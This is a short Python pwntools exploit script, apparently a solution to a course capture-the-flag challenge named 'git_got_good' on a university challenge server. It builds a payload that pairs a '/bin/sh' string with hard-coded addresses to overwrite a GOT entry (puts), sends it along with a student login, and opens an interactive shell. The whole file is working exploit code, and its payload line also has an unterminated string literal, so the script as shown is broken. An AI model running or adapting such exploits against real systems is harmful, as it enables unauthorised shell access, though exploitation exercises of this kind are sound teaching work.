from pwn import *

run_cmd = p64(0x40074b)
puts_offset = p64(0x601010)

payload ='/bin/sh\x00' + run_cmd + puts_offset + '\n
context.log_level = 'debug'

# p = process('./git_got_good') #for local
p = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1341) #for remote

gdb_script = '''
set follow-fork-mode parent
break * 0x400800
break puts
break printf
break fgets
'''
# 0x400800 the address where the program crashes


# gdb.attach(p, gdb_script) #for local
p.sendafter('abc123): ', 'tg1799\n') #for remote
p.sendafter('save: ', payload)
p.interactive()